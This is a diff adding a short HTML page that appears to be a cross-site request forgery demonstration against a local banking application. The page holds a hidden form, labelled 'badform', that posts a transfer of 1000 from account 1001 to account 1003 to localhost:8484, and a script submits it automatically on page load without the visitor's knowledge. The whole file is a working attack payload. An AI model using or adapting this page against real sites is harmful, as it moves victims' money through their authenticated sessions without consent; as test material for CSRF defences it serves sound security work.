@@ -1,0 +1,17 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <title></title>
+</head>
+<body>
+<form id="badform" method="post" action="localhost:8484">
+    <input type="hidden" name="toAccount" value="1003"/>
+    <input type="hidden" name="fromAccount" value="1001"/>
+    <input type="hidden" name="amount" value="1000"/>
+</form>
+<script>
+    document.getElementById('badform').submit();
+</script>
+</body>
+</html>
